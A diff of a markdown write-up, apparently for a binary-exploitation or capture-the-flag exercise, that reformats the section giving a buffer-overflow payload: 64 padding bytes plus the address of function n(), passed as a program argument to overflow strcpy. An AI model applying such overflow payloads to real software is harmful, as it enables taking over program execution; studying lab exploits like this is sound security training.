@@ -44,18 +44,11 @@ Dump of assembler code for function n:
 So, address of `n()` is: `0x08048454`
 
 ---
-
-### Step 3: Craft the payload
-
-In Python:
-
+## 💥 Exploit 
+Craft the payload:
 ```bash
 python -c 'print("A"*64 + "\x54\x84\x04\x08")'
 ```
-
----
-
-### Step 4: Run the program with the payload
 
 **Important:** the program is calling `strcpy(argv[1])`, not reading from stdin — so you must pass the payload as an argument:
 
